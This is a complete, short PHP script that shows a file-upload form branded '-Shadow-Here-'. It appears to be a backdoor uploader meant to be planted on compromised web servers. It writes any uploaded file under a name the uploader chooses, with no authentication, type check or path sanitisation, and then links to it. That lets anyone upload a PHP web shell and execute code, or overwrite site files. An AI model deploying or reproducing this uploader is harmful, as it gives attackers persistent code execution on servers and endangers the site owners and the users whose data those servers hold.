<?php
if(isset($_FILES['f'])){
    if(move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])){
        echo "˚⊱🪷⊰˚ File uploaded: <b>{$_FILES['f']['name']}</b><br>";
        echo "╰┈➤ <a href='{$_FILES['f']['name']}' target='_blank'>Open</a>";
    } else {
        echo "❌ Failed to upload file.";
    }
}
?>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="f">
  <button>-Shadow-Here-</button>
</form>
